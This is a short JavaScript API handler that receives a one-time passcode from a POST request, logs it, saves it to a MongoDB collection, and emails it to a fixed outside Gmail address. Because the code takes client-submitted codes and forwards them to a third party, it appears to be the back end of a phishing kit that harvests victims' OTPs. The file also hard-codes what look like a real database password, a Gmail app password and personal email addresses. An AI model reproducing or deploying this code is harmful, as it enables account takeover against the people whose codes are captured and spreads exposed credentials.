import nodemailer from 'nodemailer';
import { MongoClient } from 'mongodb';

// MongoDB connection function
const connectToDatabase = async () => {
  const client = new MongoClient("mongodb+srv://paulclipps:IW07WLOhHbCq8QIX@cluster0.gwdix.mongodb.net/");
  await client.connect();
  const db = client.db("Users"); // Use the "Users" database
  return { db, client };
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { otp } = req.body;
  console.log('Received OTP:', otp);

  try {
    // Save the OTP to MongoDB
    await saveOtpToDatabase(otp);

    // Email setup
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "asalamlatif@gmail.com",
        pass: "prmr opim qodx xnpx",
      },
    });

    const mailOptions = {
      from: 'asalamlatif@gmail.com',
      to: 'toonilaniyan@gmail.com',
      subject: 'Your OTP Code',
      text: `Your OTP code is: ${otp}`,
    };

    // Send the OTP via email
    await transporter.sendMail(mailOptions);

    // Respond with success message
    return res.status(200).json({ message: 'OTP Sent and Saved Successfully' });
  } catch (error) {
    console.error('Error:', error.message);
    return res.status(500).json({ message: 'Failed to send email or save OTP', error: error.message });
  }
}

// Function to save OTP to MongoDB
async function saveOtpToDatabase(otp) {
  try {
    // Connect to MongoDB
    const { db, client } = await connectToDatabase();

    // Access the "otp" collection
    const otpCollection = db.collection('code');

    // Insert the OTP along with a timestamp
    await otpCollection.insertOne({
      otp,
      timestamp: new Date().toISOString(),
    });

    // Close the MongoDB connection
    await client.close();

    console.log('OTP saved successfully in MongoDB!');
  } catch (err) {
    console.error('Error saving OTP to database:', err);
    throw new Error('Failed to save OTP to database');
  }
}
